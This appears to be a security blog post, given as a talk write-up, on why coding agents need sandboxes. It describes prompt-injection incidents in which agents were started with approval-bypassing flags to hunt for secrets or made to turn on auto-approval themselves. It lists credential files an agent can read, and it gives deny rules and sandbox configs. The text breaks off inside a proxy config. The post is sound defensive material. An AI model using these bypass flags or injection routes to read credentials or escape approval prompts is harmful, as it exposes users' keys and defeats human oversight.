@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#04090f">
+
+<title>Your Coding Agent Runs as You — Roald Nefs</title>
+
+
+<meta name="description" content="Personal research blog on software engineering, security, AI, platform engineering, and hardware hacking.">
+
+
+<meta name="author" content="Roald Nefs">
+
+<meta property="og:site_name" content="Roald Nefs">
+<meta property="og:title" content="Your Coding Agent Runs as You">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://roaldnefs.com/posts/2026/11/your-coding-agent-runs-as-you/">
+<meta property="og:description" content="A coding agent on your laptop runs as your user, with every key you have. This is the written version of my aiGrunn talk on why that needs a sandbox, what a sandbox has to limit, and five places to run an agent instead.">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://roaldnefs.com/posts/2026/11/your-coding-agent-runs-as-you/">
+
+<link rel="icon" href="/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png">
+
+
+
+<link rel="preload" href="/fonts/urbanist-latin.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  <link rel="stylesheet" href="/css/main.min.42671717c9faa9de4f33d261fb0ea0cfd120bebc3b33cd7b42668f542db73e48.css" integrity="sha256-QmcXF8n6qd5PM9Jh&#43;w6gz9Egvrw7M817QmaPVC23Pkg=">
+
+
+
+  
+  <script src="/js/main.min.45f023d2efa202a25c6cd76e38eb6e47fde44895e1b385d1f741ff92e70eea03.js" integrity="sha256-RfAj0u&#43;iAqJcbNduOOtuR/3kSJXhs4XR90H/kucO6gM=" defer></script>
+
+
+</head>
+<body class="has-aside">
+  <a href="#main" class="skip-link">Skip to content</a>
+  <div class="backdrop" aria-hidden="true"></div>
+  <header class="site-header">
+  <div class="site-header-bg" aria-hidden="true"></div>
+  <div class="container site-header-inner">
+    <a class="wordmark" href="/">Roald Nefs</a>
+    <nav class="site-nav" aria-label="Primary">
+      
+        
+      
+        
+          
+          <a href="/posts/" class="nav-link" aria-current="page">Blog</a>
+        
+      
+        
+          
+          <a href="/training/" class="nav-link">Training</a>
+        
+      
+        
+          
+          <a href="/tools/" class="nav-link">Tools</a>
+        
+      
+        
+          
+          <a href="/about/" class="nav-link">About</a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </nav>
+    <div class="site-header-actions">
+      <a class="btn header-cta" href="/training/#book-a-session">Book a workshop</a>
+      <button type="button" class="nav-toggle" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+        <span></span><span></span>
+      </button>
+    </div>
+  </div>
+  <div class="menu" id="menu">
+    <nav class="menu-links" aria-label="Menu">
+      
+        
+          
+          <a href="/">Home<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg></a>
+        
+      
+        
+          
+          <a href="/posts/">Blog<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg></a>
+        
+      
+        
+          
+          <a href="/training/">Training<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg></a>
+        
+      
+        
+          
+          <a href="/tools/">Tools<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg></a>
+        
+      
+        
+          
+          <a href="/about/">About<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg></a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </nav>
+    <div class="menu-follow">
+      <span>Follow</span>
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/roaldnefs" rel="me noopener" target="_blank" aria-label="GitHub"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .3a12 12 0 0 0-3.8 23.38c.6.12.83-.26.83-.57v-2c-3.33.73-4.03-1.6-4.03-1.6-.55-1.38-1.33-1.75-1.33-1.75-1.08-.74.08-.73.08-.73 1.2.08 1.83 1.23 1.83 1.23 1.08 1.83 2.8 1.3 3.5 1 .1-.78.42-1.3.77-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.3.47-2.38 1.23-3.22-.12-.3-.54-1.52.12-3.18 0 0 1-.32 3.3 1.23a11.4 11.4 0 0 1 6 0c2.3-1.55 3.3-1.23 3.3-1.23.66 1.66.24 2.88.12 3.18.77.84 1.23 1.92 1.23 3.22 0 4.6-2.8 5.63-5.47 5.92.42.36.82 1.1.82 2.22v3.3c0 .32.22.7.83.58A12 12 0 0 0 12 .3"/></svg></a>
+        
+      
+        
+          <a href="https://www.linkedin.com/in/roaldnefs/" rel="me noopener" target="_blank" aria-label="LinkedIn"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.03-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.95v5.66H9.35V9h3.42v1.56h.05c.48-.9 1.64-1.85 3.37-1.85 3.6 0 4.27 2.37 4.27 5.46v6.28zM5.34 7.43a2.07 2.07 0 1 1 0-4.13 2.07 2.07 0 0 1 0 4.13zM7.12 20.45H3.56V9h3.56v11.45zM22.22 0H1.77C.8 0 0 .77 0 1.72v20.56C0 23.23.8 24 1.77 24h20.45c.98 0 1.78-.77 1.78-1.72V1.72C24 .77 23.2 0 22.22 0z"/></svg></a>
+        
+      
+        
+          <a href="https://infosec.exchange/@roald" rel="me noopener" target="_blank" aria-label="Mastodon"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M23.27 5.32c-.36-2.67-2.7-4.78-5.5-5.19C17.3.06 15.48 0 12.14 0h-.03c-3.34 0-4.05.06-4.52.13-2.72.4-5.18 2.3-5.77 5-.28 1.33-.31 2.8-.26 4.15.07 1.95.08 3.89.26 5.83.12 1.28.33 2.56.6 3.82.5 2.33 2.83 4.27 5.11 5.06 2.45.85 5.08.99 7.61.4.28-.06.55-.14.82-.23.6-.2 1.3-.42 1.81-.8a.06.06 0 0 0 .03-.05v-1.76a.05.05 0 0 0-.07-.05c-1.57.37-3.18.56-4.8.56-2.78 0-3.53-1.32-3.74-1.87a5.76 5.76 0 0 1-.33-1.5.05.05 0 0 1 .06-.05c1.55.37 3.13.56 4.72.56.38 0 .76 0 1.14-.01 1.6-.04 3.28-.13 4.85-.43.04 0 .08-.01.11-.02 2.48-.48 4.84-1.97 5.08-5.74.01-.15.04-1.56.04-1.71.01-.53.18-3.74-.03-5.7zm-3.9 9.46h-2.42V8.9c0-1.24-.52-1.87-1.56-1.87-1.15 0-1.72.74-1.72 2.22v3.2h-2.4v-3.2c0-1.47-.58-2.22-1.73-2.22-1.04 0-1.56.63-1.56 1.87v5.88H5.56V8.72c0-1.23.31-2.22.94-2.94.65-.72 1.5-1.1 2.56-1.1 1.22 0 2.15.47 2.77 1.4l.6 1.01.6-1.01c.63-.93 1.55-1.4 2.77-1.4 1.05 0 1.9.38 2.56 1.1.63.72.94 1.71.94 2.94v6.06z"/></svg></a>
+        
+      
+    </div>
+  </div>
+</header>
+
+  <main id="main">
+    
+
+
+<article>
+  
+    <header class="post-hero">
+      <img class="post-hero-art" src="/covers/your-coding-agent-runs-as-you.svg" alt="" width="1600" height="900" fetchpriority="high">
+      <div class="container post-hero-inner">
+        <nav class="breadcrumb" aria-label="Breadcrumb">
+          <a href="/posts/">Blog</a>
+          
+          
+          
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg>
+            <a href="/categories/ai/">AI</a>
+          
+        </nav>
+        <h1 class="post-title reveal">Your Coding Agent Runs as You</h1>
+        <dl class="post-meta">
+          <div>
+            <dt>Author</dt>
+            <dd>Roald Nefs</dd>
+          </div>
+          <div>
+            <dt>Published</dt>
+            <dd><time datetime="2026-11-12">Nov 12, 2026</time></dd>
+          </div>
+          <div>
+            <dt>Reading time</dt>
+            <dd>17 min</dd>
+          </div>
+        </dl>
+      </div>
+    </header>
+  
+
+  <div class="container post-layout">
+    <div class="post-main">
+      
+        <details class="toc-box">
+          <summary><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg><span>On this page</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 18 6-6-6-6"/></svg></summary>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#one-flag-and-the-agent-stops-asking">One flag, and the agent stops asking</a></li>
+    <li><a href="#the-lethal-trifecta">The lethal trifecta</a></li>
+    <li><a href="#this-has-already-happened">This has already happened</a></li>
+    <li><a href="#a-permission-prompt-is-not-a-wall">A permission prompt is not a wall</a></li>
+    <li><a href="#what-a-sandbox-has-to-limit">What a sandbox has to limit</a></li>
+    <li><a href="#where-to-run-it">Where to run it</a>
+      <ul>
+        <li><a href="#option-1-the-local-os-sandbox">Option 1: the local OS sandbox</a></li>
+        <li><a href="#option-2-docker">Option 2: Docker</a></li>
+        <li><a href="#option-3-a-vm">Option 3: a VM</a></li>
+        <li><a href="#option-4-a-cicd-runner">Option 4: a CI/CD runner</a></li>
+        <li><a href="#option-5-kubernetes">Option 5: Kubernetes</a></li>
+        <li><a href="#all-five-side-by-side">All five, side by side</a></li>
+      </ul>
+    </li>
+    <li><a href="#a-sandbox-is-not-the-whole-answer">A sandbox is not the whole answer</a>
+      <ul>
+        <li><a href="#monitor">Monitor</a></li>
+        <li><a href="#canary">Canary</a></li>
+      </ul>
+    </li>
+    <li><a href="#demo-a-poisoned-dependency">Demo: a poisoned dependency</a>
+      <ul>
+        <li><a href="#run-1-the-flag-sandbox-off">Run 1: the flag, sandbox off</a></li>
+        <li><a href="#run-2-no-flag-sandbox-on">Run 2: no flag, sandbox on</a></li>
+        <li><a href="#why-this-works">Why this works</a></li>
+      </ul>
+    </li>
+    <li><a href="#five-things-to-do-tomorrow">Five things to do tomorrow</a></li>
+  </ul>
+</nav>
+        </details>
+      
+      <div class="prose">
+        <h2 id="introduction">Introduction</h2>
+<p>This post is the written version of the talk I gave at aiGrunn in Groningen on 13 November 2026. I build with coding agents every day, and my other job is breaking into things. This is where those two meet.</p>
+<p>In a few years we went from pasting code snippets out of a chat, to autocomplete in the editor, to agents that run commands on our own laptops. The next steps are already here: agents that run on a machine that is not yours, triggered by an issue or an alert, and agents that work with other agents. Robert Brennan of OpenHands used this framing in his talk <a href="https://www.youtube.com/watch?v=iH_wV8BbS24" rel="noopener noreferrer" target="_blank">&ldquo;Sandboxes Aren&rsquo;t Optional&rdquo;</a> at the AI Engineer World&rsquo;s Fair 2026, and I agree with his conclusion. Where the agent runs, and what it can reach there, is becoming the security question.</p>
+<p>Most of us are still at the third step: an agent in a terminal, on a laptop. And that step has a flag.</p>
+<h2 id="one-flag-and-the-agent-stops-asking">One flag, and the agent stops asking</h2>
+<p>You open a terminal, start your agent in a repository and give it a job. It asks before it runs something. For a while. Then you get tired of saying yes, and you find this:</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>claude --dangerously-skip-permissions</span></span></code></pre></div>
+</div>
+<p>This is not specific to Claude Code. Every agent has this switch, and the names tell you the vendors know what it is:</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>codex --dangerously-bypass-approvals-and-sandbox
+</span></span><span style="display:flex;"><span>codex --yolo
+</span></span><span style="display:flex;"><span>gemini --approval-mode<span style="color:#f92672">=</span>yolo</span></span></code></pre></div>
+</div>
+<p>The Claude Code documentation says to use the flag only in isolated environments such as containers or VMs without internet access<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. I have run it on my own laptop anyway, and so have most people I ask.</p>
+<p>So what does the agent get when it stops asking? There is no agent user on your laptop. There is you.</p>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>you
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># so the agent can read
+</span></span><span style="display:flex;"><span>~/.ssh/               # your servers, git push
+</span></span><span style="display:flex;"><span>~/.aws/credentials    # your cloud
+</span></span><span style="display:flex;"><span>~/.kube/config        # your clusters
+</span></span><span style="display:flex;"><span>~/.npmrc              # your publish token
+</span></span><span style="display:flex;"><span>.env                  # the app&#39;s secrets
+</span></span><span style="display:flex;"><span>browser profile       # sessions already logged in</span></span></code></pre></div>
+</div>
+<p>The last one deserves a second look: a browser session is already past your MFA.</p>
+<h2 id="the-lethal-trifecta">The lethal trifecta</h2>
+<p>The agent is on your side, so why would it go and read your keys? Because the agent obeys text, and not all of that text is yours. A model cannot reliably tell your instructions from instructions inside the things it reads. That is prompt injection.</p>
+<p>Simon Willison calls the dangerous combination the lethal trifecta<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>: access to private data, exposure to untrusted content, and the ability to communicate externally. With all three together an attacker can make the agent send your data out.</p>
+<p><img src="/images/posts/2026/11/13/lethal-trifecta.svg" alt="The lethal trifecta: private data, untrusted content and a way out"></p>
+<p>A coding agent on your laptop has all three by default.</p>
+<h2 id="this-has-already-happened">This has already happened</h2>
+<p>Three public cases, two of them in the wild.</p>
+<p><strong>Nx, &ldquo;s1ngularity&rdquo; (August 2025, in the wild).</strong> A malicious npm package did not bring its own tooling. It looked for Claude Code, Gemini CLI and Amazon Q on the victim&rsquo;s machine and started them with <code>--dangerously-skip-permissions</code>, <code>--yolo</code> and <code>--trust-all-tools</code>, with a prompt to go and find secrets. According to Wiz, over a thousand valid GitHub tokens leaked, along with dozens of cloud credentials and npm tokens<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
+<p><strong>CVE-2025-53773 (August 2025, research).</strong> A prompt injection made GitHub Copilot write <code>&quot;chat.tools.autoApprove&quot;: true</code> into its own settings file and then run commands<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>. The agent gave itself the flag. This was a research disclosure and has not been seen in the wild.</p>
+<p><strong>Cline CLI (February 2026, in the wild).</strong> An agent that triaged GitHub issues could be triggered, and prompt injected, by any GitHub user. An unauthorised <code>cline@2.3.0</code> was published to npm. The exposure window was about eight hours according to their post-mortem<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup>.</p>
+<h2 id="a-permission-prompt-is-not-a-wall">A permission prompt is not a wall</h2>
+<p>The usual answer is to keep the permission prompts on. But asking more often does not make it safer. People stop reading, and then they find the flag.</p>
+<p>Anthropic calls this approval fatigue and has published two numbers that tell the story. Users accept 93% of permission prompts<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup>. And in Anthropic&rsquo;s internal usage, turning the sandbox on reduced the number of prompts by 84%<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup>.</p>
+<p>Read those two together. The wall is what lets you stop asking. Sandboxing is safer and less annoying at the same time, which is why I think it should not be a choice. It is a requirement.</p>
+<h2 id="what-a-sandbox-has-to-limit">What a sandbox has to limit</h2>
+<p>A sandbox limits three things: the files the agent can touch, the network it can reach, and the credentials it holds.</p>
+<p><img src="/images/posts/2026/11/13/sandbox-limits.svg" alt="A sandbox limits files, network and credentials"></p>
+<p>Map this back to the trifecta. Files and credentials take away the private data, and the network takes away the way out. You cannot take away the untrusted content, because reading it is the job.</p>
+<p>The same rule of least privilege goes for the agent&rsquo;s tools. An MCP server or a skill is more reach for the agent, and memory is state that the next run inherits. Give it only what this job needs.</p>
+<p>These three limits are the checklist for everything that follows. For each place to run an agent, ask: what can it read, where can it connect, and whose keys does it hold?</p>
+<h2 id="where-to-run-it">Where to run it</h2>
+<p>There are five options, from closest to your laptop to furthest away.</p>
+<p><img src="/images/posts/2026/11/13/where-to-run.svg" alt="Five places to run a coding agent, from your laptop outwards"></p>
+<h3 id="option-1-the-local-os-sandbox">Option 1: the local OS sandbox</h3>
+<p>The quickest wall, and the thinnest. It costs one command and no waiting. In Claude Code it is <code>/sandbox</code>, and it is off by default<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup>. It uses the operating system&rsquo;s own mechanism: Seatbelt on macOS, the same thing that sandboxes apps on your Mac, and bubblewrap on Linux. Codex CLI does the same with Seatbelt on macOS and bubblewrap and seccomp on Linux. The runtime behind Claude Code&rsquo;s sandbox is open source as <a href="https://github.com/anthropics/sandbox-runtime" rel="noopener noreferrer" target="_blank">sandbox-runtime</a>.</p>
+<p>What you get: writes stay inside the project, and the network goes through a domain allowlist that starts empty.</p>
+<p>What to watch out for:</p>
+<ul>
+<li>It covers shell commands only. Not the file tools, MCP servers or hooks.</li>
+<li>Native Windows is not sandboxed. WSL2 is.</li>
+</ul>
+<aside class="callout callout-warning">
+  <span class="callout-prefix">warning:</span>
+  <div class="callout-body">By default the sandbox still lets commands <strong>read</strong> your whole machine, credential files included. Writes and network are locked down, reads are not. Add deny rules for <code>~/.ssh</code>, <code>~/.aws</code> and the rest.</div>
+</aside>
+
+<p>To turn it on for every project, with two credential paths denied, put this in <code>~/.claude/settings.json</code>:</p>
+<div class="code">
+  <div class="code-head">
+    <span>json</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sandbox&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;enabled&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;credentials&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;files&#34;</span>: [
+</span></span><span style="display:flex;"><span>        { <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;~/.aws/credentials&#34;</span>, <span style="color:#f92672">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;deny&#34;</span> },
+</span></span><span style="display:flex;"><span>        { <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;~/.ssh&#34;</span>, <span style="color:#f92672">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;deny&#34;</span> }
+</span></span><span style="display:flex;"><span>      ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+</div>
+<h3 id="option-2-docker">Option 2: Docker</h3>
+<p>A good wall, as long as you mount little. Most of us already have Docker, so this is the cheapest real step up. A dev container<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup> with only the project mounted and a firewall that denies by default goes a long way. Anthropic publishes a reference dev container with an <code>init-firewall</code> script that only lets outbound traffic through to an allowlist<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup>. It is a working example, not a maintained base image.</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. take the reference dev container into your project</span>
+</span></span><span style="display:flex;"><span>git clone https://github.com/anthropics/claude-code
+</span></span><span style="display:flex;"><span>cp -r claude-code/.devcontainer .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. start it: builds the image, mounts the project, raises the firewall</span>
+</span></span><span style="display:flex;"><span>npm install -g @devcontainers/cli
+</span></span><span style="display:flex;"><span>devcontainer up --workspace-folder .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. run the agent inside, as the container&#39;s non-root user</span>
+</span></span><span style="display:flex;"><span>devcontainer exec --workspace-folder . claude --dangerously-skip-permissions</span></span></code></pre></div>
+</div>
+<p>The flag refuses to run as root, which is why the container uses a non-root user.</p>
+<p>What to watch out for:</p>
+<ul>
+<li>Containers share the host&rsquo;s kernel.</li>
+<li>The container is only as good as what you put in it. Mount your home directory and you have built nothing.</li>
+<li>Never hand it the Docker socket. That is root on the host<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup>.</li>
+<li>What is inside can still leak, the agent&rsquo;s own login in <code>~/.claude</code> included.</li>
+</ul>
+<h3 id="option-3-a-vm">Option 3: a VM</h3>
+<p>Its own kernel between the agent and you. This is the strongest wall you can have on your own machine, and &ldquo;VMs are slow&rdquo; is an old idea. Firecracker&rsquo;s own numbers are a boot in under 125 ms and under 5 MiB of overhead per VM<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup>. Docker Sandboxes<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup> and Apple&rsquo;s <a href="https://github.com/apple/container" rel="noopener noreferrer" target="_blank">container</a> both give you a microVM per sandbox. It costs memory and disk, but not much time.</p>
+<p>With <a href="https://lima-vm.io/" rel="noopener noreferrer" target="_blank">Lima</a> you get a Linux VM that sees only the current project<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup>:</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>limactl start --mount-only .:w
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># install the agent in the VM</span>
+</span></span><span style="display:flex;"><span>lima sudo snap install node --classic
+</span></span><span style="display:flex;"><span>lima sudo npm install -g @anthropic-ai/claude-code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and run it there</span>
+</span></span><span style="display:flex;"><span>lima claude</span></span></code></pre></div>
+</div>
+<p>Watch out for Lima&rsquo;s default template: without <code>--mount-only</code> it mounts your whole home directory read-only. Read-only still means the guest can read <code>~/.ssh</code>.</p>
+<p>With Docker Sandboxes each sandbox is a microVM with its own Docker daemon, and outbound traffic goes through a proxy on the host with a network policy you set first:</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd ~/my-project
+</span></span><span style="display:flex;"><span>sbx policy init balanced
+</span></span><span style="display:flex;"><span>sbx run --name my-sandbox claude
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># allow one more host, look, throw it away</span>
+</span></span><span style="display:flex;"><span>sbx policy allow network registry.npmjs.org
+</span></span><span style="display:flex;"><span>sbx ls
+</span></span><span style="display:flex;"><span>sbx rm my-sandbox</span></span></code></pre></div>
+</div>
+<p><code>sbx rm</code> deletes the sandbox and everything in it. Your project files stay.</p>
+<h3 id="option-4-a-cicd-runner">Option 4: a CI/CD runner</h3>
+<p>Nothing of yours is there to steal. Your SSH keys cannot leak from a machine they were never on. Hosted runners on GitHub and GitLab give you a new VM for each job, and the job&rsquo;s token lives only as long as the job. Scope it down<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup>.</p>
+<div class="code">
+  <div class="code-head">
+    <span>yaml</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">jobs</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">agent</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">runs-on</span>: <span style="color:#ae81ff">ubuntu-latest       </span> <span style="color:#75715e"># a fresh VM for this job</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">permissions</span>:                  <span style="color:#75715e"># all the job&#39;s token may do</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">contents</span>: <span style="color:#ae81ff">read</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">pull-requests</span>: <span style="color:#ae81ff">write</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">id-token</span>: <span style="color:#ae81ff">write</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">steps</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/checkout@v6</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">anthropics/claude-code-action@v1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">anthropic_api_key</span>: <span style="color:#ae81ff">${{ secrets.ANTHROPIC_API_KEY }}</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">prompt</span>: <span style="color:#e6db74">&#34;Fix the failing checkout tests and open a pull request&#34;</span></span></span></code></pre></div>
+</div>
+<p>The <code>permissions</code> block is the whole reach of the job: read the code, write a pull request, nothing else. With a plain prompt the agent has no shell access in the job until you grant tools with <code>--allowedTools</code> in <code>claude_args</code>, so this job still needs that line before it can run the tests<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup>. GitLab CI/CD works the same way with a job token and has its own Claude Code integration, in beta.</p>
+<p>What to watch out for:</p>
+<ul>
+<li>It is a slow loop: push, wait, read. This is for tasks, not for pairing.</li>
+<li>Issues and merge requests are untrusted input. This is the Cline case from earlier: the agent ran in CI, read an issue anyone could write, and had a publish token within reach. The runner protects your laptop. It does not protect the secrets you give the job.</li>
+<li>Self-hosted runners are only ephemeral if you make them so.</li>
+</ul>
+<h4 id="the-agent-can-use-the-key-but-never-read-it">The agent can use the key, but never read it</h4>
+<p>That job still holds an API key. In our own agent pipeline on GitLab CI/CD we give the agent the use of a key without giving it the key. A Caddy proxy runs as root in the job, with the real key as its only variable. The agent runs as another user and sends its requests to the proxy with a placeholder. The proxy puts the real key in, only on the paths the agent needs. This is the Caddyfile, abridged:</p>
+<div class="code">
+  <div class="code-head">
+    <span>caddyfile</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-caddyfile" data-lang="caddyfile"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">off</span><span style="color:#75715e">    # no way to reconfigure it
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://127.0.0.1:8080 {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">@claude</span> <span style="color:#66d9ef">path</span> <span style="color:#e6db74">/v1/messages</span> <span style="color:#e6db74">/v1/messages/count_tokens</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">handle</span> <span style="color:#a6e22e">@claude</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">reverse_proxy</span> <span style="color:#e6db74">https://api.anthropic.com</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">header_up</span> <span style="color:#e6db74">Host</span> <span style="color:#ae81ff">{upstream_hostport}</span>
